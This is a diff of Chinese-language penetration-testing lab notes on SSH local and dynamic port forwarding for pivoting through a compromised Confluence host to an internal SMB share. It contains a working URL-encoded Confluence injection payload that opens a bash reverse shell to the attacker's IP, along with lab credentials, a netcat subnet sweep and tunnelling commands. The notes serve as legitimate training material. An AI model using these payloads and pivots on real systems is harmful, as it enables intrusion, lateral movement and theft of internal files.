@@ -1496,3 +1496,300 @@ database_admin@pgdatabase01:~$
 >需要額外啟用 Linux 封包轉發功能: `echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding`
 
 ## SSH Tunneling
+[Tunneling protocol](https://en.wikipedia.org/wiki/Tunneling_protocol): 將一種 data stream 封裝在另一種 data stream 中，並透過網路傳輸。[SSH](https://en.wikipedia.org/wiki/Secure_Shell)（Secure Shell）也是其中一種 protocol。\
+在 SSH 之前（未加密）： `rsh`、`rlogin`、`Telnet`\
+在官方文件中，SSH Tunneling 通常被稱為 SSH Port Forwarding
+### SSH Local Port Forwarding
+[SSH local port forwarding](https://man.openbsd.org/ssh#L) 與上述 socat port forwarding 不同之處，是在兩個 hosts（ SSH client與 SSH server）之間建立 SSH connection，所有流量都從 Tunnel 通過。\
+- 場景修改：
+    - CONFLUENCE01 不再支援 socat
+    - 我們仍然擁有 database_admin credentials，可 SSH 進入 PGDATABASE01。
+    - 在 PGDATABASE01 內部網段，發現一台新的 SMB 伺服器（TCP 445）
+    - 目標：我們希望從 Kali 下載 SMB 伺服器上的檔案。
+
+- 解法：
+    - 透過 SSH Local Port Forwarding 來建立隧道：
+    - 讓 CONFLUENCE01 監聽 TCP 4455。
+    - 所有發送到 4455 的流量會透過 SSH 隧道傳送到 PGDATABASE01。
+    - PGDATABASE01 會進一步將流量轉發到內部 SMB 伺服器（TCP 445）。
+    ![image](https://hackmd.io/_uploads/ryfDVN7o1l.png)
+#### 1. Python 3's pty module with TTY functionality
+重新注入 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.147.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5678%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 5678
+listening on [any] 5678 ...
+connect to [192.168.45.166] from (UNKNOWN) [192.168.147.63] 47734
+bash: cannot set terminal process group (2111): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ 
+```
+在 SSH connection 之前，先做 enumeration，確保 shell 中， Python 3 的 pty module 具有 [TTY](https://en.wikipedia.org/wiki/TTY) functionality。
+>[!Warning]
+>If we have problems with `/bin/bash` we can switch to `/bin/sh`.\
+>`/bin/bash` 與 `/bin/sh` 差異可參考 [Part 1 Local File Inclusion (LFI) (4)](https://hackmd.io/@CHW/BJ0sNztaR#1-Local-File-Inclusion-LFI)
+
+CONFLUENCE01 建立了到 PGDATABASE01 的 SSH connection
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ ssh database_admin@10.4.147.215
+ssh database_admin@10.4.147.215
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.147.215 (10.4.147.215)' can't be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.147.215's password: sqlpass123
+
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 03 Mar 2025 02:08:53 PM UTC
+
+  System load:  0.02              Processes:               233
+  Usage of /:   80.5% of 6.79GB   Users logged in:         0
+  Memory usage: 15%               IPv4 address for ens192: 10.4.147.215
+  Swap usage:   0%                IPv4 address for ens224: 172.16.147.254
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
+database_admin@pgdatabase01:~$ 
+```
+#### 2. 在 target machine 查看 network interface
+開始在 PGDATABASE01 枚舉 network interface
+```
+database_admin@pgdatabase01:~$ ip addr
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:ab:92:f0 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.147.215/24 brd 10.4.147.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:ab:db:8a brd ff:ff:ff:ff:ff:ff
+    inet 172.16.147.254/24 brd 172.16.147.255 scope global ens224
+       valid_lft forever preferred_lft forever
+database_admin@pgdatabase01:~$ ip route
+ip route
+default via 10.4.147.254 dev ens192 proto static 
+10.4.147.0/24 dev ens192 proto kernel scope link src 10.4.147.215 
+172.16.147.0/24 dev ens224 proto kernel scope link src 172.16.147.254 
+```
+> 發現 PGDATABASE01 能夠連線到另一個 subnet `172.16.147.0/24`
+
+#### 2. 在 target machine 枚舉
+開始搜尋 subnet，但環境中沒有安裝 reconnaissance tool\
+所以使用 Bash for loop 檢查有開放 445 port 的主機
+```
+database_admin@pgdatabase01:~$ nmap
+nmap
+
+Command 'nmap' not found, but can be installed with:
+
+snap install nmap  # version 7.93, or
+apt  install nmap  # version 7.80+dfsg1-2build1
+
+See 'snap info nmap' for additional versions.
+
+database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.147.$i 445; done
+<(seq 1 254); do nc -zv -w 1 172.16.147.$i 445; done
+nc: connect to 172.16.147.1 port 445 (tcp) timed out: Operation now in progress
+nc: connect to 172.16.147.2 port 445 (tcp) timed out: Operation now in progress
+nc: connect to 172.16.147.3 port 445 (tcp) timed out: Operation now in progress
+...
+Connection to 172.16.147.217 445 port [tcp/microsoft-ds] succeeded!
+nc: connect to 172.16.147.218 port 445 (tcp) timed out: Operation now in progress
+nc: connect to 172.16.147.219 port 445 (tcp) timed out: Operation now in progress
+...
+```
+> `for i in $(seq 1 254); do ... done`: 產生迴圈 (172.16.147.1 到 172.16.147.254)\
+> `nc -zv -w 1 172.16.147.$i 445`:
+> - `-z（Zero-I/O mode）`：只檢查端口是否開啟，不傳送資料
+> - `-v（Verbose）`： 詳細顯示
+> - `-w 1（Timeout 1 秒）`：設置 1 秒超時，防止掃描過慢
+> > 找到 SMB ip: `172.16.147.217:445`
+
+#### 3. Download SMB Server file
+##### 3.1 [方法 1] 使用內建工具傳回 CONFLUENCE01
+內建工具： smbclient, smbget, mount.cifs, rpcclient 等等
+##### 3.2 [方法 2] SSH local port forwarding
+可以建立 SSH local port forwarding。將監聽 CONFLUENCE01 的 WAN interface 的 4455 port，並透過 SSH Tunnel 將封包從 PGDATABASE01 轉送出去並直接轉送到我們找到的 SMB 共用。然後我們可以直接從 Kali 機器連接到 CONFLUENCE01 上的監聽 port。
+
+斷開 SSH，回到 CONFLUENCE01 建立 SSH local port forwarding：
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ ssh -N -L 0.0.0.0:4455:172.16.147.217:445 database_admin@10.4.147.215
+ssh -N -L 0.0.0.0:4455:172.16.147.217:445 database_admin@10.4.147.215
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.147.215 (10.4.147.215)' can't be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.147.215's password: sqlpass123
+
+```
+>`-N`：不執行命令，只建立 SSH Tunnel\
+>`-L 0.0.0.0:4455:172.16.147.217:445`: local port 0.0.0.0:4455 → 轉發到 172.16.50.147:445（透過 PGDATABASE01 轉到 SMB Server)，`0.0.0.0` 讓為了讓 Kali 能直接存取這個 port。
+>> SSH local port forwarding 已成功打通
+
+#### 4. 驗證 SSH local port forwarding
+再注入一個 reverse shell 驗證 port forwarding 是不是成功
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.147.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/8888%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.166] from (UNKNOWN) [192.168.147.63] 58090
+bash: cannot set terminal process group (2111): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu
+ss -ntplu
+Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
+udp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*                                                                                     
+tcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*                                                                                     
+tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=4281,fd=4))                                                  
+tcp    LISTEN  0       128                     [::]:22               [::]:*                                                                                     
+tcp    LISTEN  0       10                         *:8090                *:*      users:(("java",pid=2160,fd=44))                                                
+tcp    LISTEN  0       1024                       *:8091                *:*      users:(("java",pid=2582,fd=21))                                                
+tcp    LISTEN  0       1         [::ffff:127.0.0.1]:8000                *:*      users:(("java",pid=2160,fd=77))                                             
+```
+> `ss`：類似於 netstat，但速度更快，用於顯示網路連線資訊。\
+`-n`：不解析 DNS\
+`-t`：顯示 TCP 連線
+`-p`：顯示與連線相關的 process 名稱\
+`-l`：顯示正在 監聽 (LISTEN) 的 port\
+`-u`：顯示 UDP 連線。
+>>`tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=4281,fd=4))`: 成功利用 4455 port 打通 SSH forwarding (到 SMB Server: 172.16.147.217:445)
+
+![image](https://hackmd.io/_uploads/Hky-MS7s1g.png)
+
+#### 5. 利用 smbclient 共享檔案
+透過剛剛打通的 4455 port 連接 SMB Server
+```
+┌──(chw㉿CHW)-[~]
+└─$ smbclient -p 4455 -L //192.168.147.63/ -U hr_admin --password=Welcome1234
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.147.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
+Unable to connect with SMB1 -- no workgroup available
+```
+>`-L`: 只列出共享資源，代表能夠成功存取
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ smbclient -p 4455 //192.168.147.63/scripts -U hr_admin --password=Welcome1234
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Sep 13 04:37:59 2022
+  ..                                 DR        0  Tue Sep  6 11:02:37 2022
+  Provisioning.ps1                   AR     1806  Mon Mar  3 08:45:25 2025
+
+                5319935 blocks of size 4096. 337010 blocks available
+smb: \> get Provisioning.ps1
+getting file \Provisioning.ps1 of size 1806 as Provisioning.ps1 (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
+smb: \>
+```
+> `//192.168.147.63/scripts`: 指定要連接 192.168.147.63 這台機器上的 scripts 共享資料夾
+
+![image](https://hackmd.io/_uploads/Hy07EHmiyx.png)
+> 也可以查看其他資料夾
+
+>[!Important]
+>整個 SSH Local Port Forwarding 架構：
+>`Kali → CONFLUENCE01:4455 → (SSH 隧道) → PGDATABASE01 → 172.16.147.217:445 (SMB)`
+
+### SSH Dynamic Port Forwarding
+>[!Caution]
+> Local port forwarding 有一個限制:\
+> Only connect to **one** socket per SSH connection
+
+OpenSSH 提供了 [dynamic port forwarding](https://man.openbsd.org/ssh#D)，可以讓一個 SSH 連線同時轉發多個不同的連線
+SSH Local Port Forwarding (`-L`)，而 SSH Dynamic port forwarding (`-D`) 則是透過建立 SOCKS proxy server port，允許任何應用程式發送請求，並透過 SSH 連線進行轉發，使我們能夠存取 SSH 伺服器能夠路由的任何目標。
+![image](https://hackmd.io/_uploads/SJ_S8rmskx.png)
+
+現在架構在監聽 WAN 上的 TCP port 9999\
+目標： 以 SOCKS proxy 的 dynamic port forwarding 方式建立 SSH Tunnel
+
+#### 1. 建立交互式的 TTY shell
+一樣先注入 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.147.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/8888%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.166] from (UNKNOWN) [192.168.147.63] 37096
+bash: cannot set terminal process group (2117): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
+ip route
+default via 192.168.147.254 dev ens192 proto static 
+10.4.147.0/24 dev ens224 proto kernel scope link src 10.4.147.63 
+192.168.147.0/24 dev ens192 proto kernel scope link src 192.168.147.63 
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ 
+```
+#### 2. 建立 OpenSSH dynamic port forward
+```
+$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.147.215
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.147.215
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '10.4.147.215 (10.4.147.215)' can't be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.147.215's password: sqlpass123
+
+```
+>[!Tip]
+> 一樣可以再使用另一個 reverse shell，執行 `ss -ntplu` 確認連線狀況
+
+>[!Note]
+>比較 Local Port Forwarding 與 Dynamic Port Forwarding\
+>![image](https://hackmd.io/_uploads/HkuxFSmjJe.png)
